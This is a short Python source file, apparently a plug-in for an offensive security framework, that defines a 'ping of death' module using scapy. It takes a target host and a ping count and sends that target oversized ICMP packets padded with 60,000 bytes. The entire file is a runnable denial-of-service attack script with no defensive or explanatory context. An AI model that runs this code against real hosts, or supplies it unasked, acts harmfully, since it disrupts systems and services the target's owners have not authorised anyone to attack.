from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

from module import Module, Type


class PingOfDeath(Module):

    def __init__(self):
        super().__init__("ping_of_death",
                         ["ping", "of", "death", "dos"],
                         "send a ping of death")

        self.add_option("RHOST", "target host", required=True, type=Type.host)
        self.add_option("PINGS", "number of pings", required=True, default=1, type=Type.int)

    def run(self):
        pkt = IP(dst=self.rhost) / ICMP() / ("X" * 60_000)
        send(pkt, verbose=False, count=self.pings)
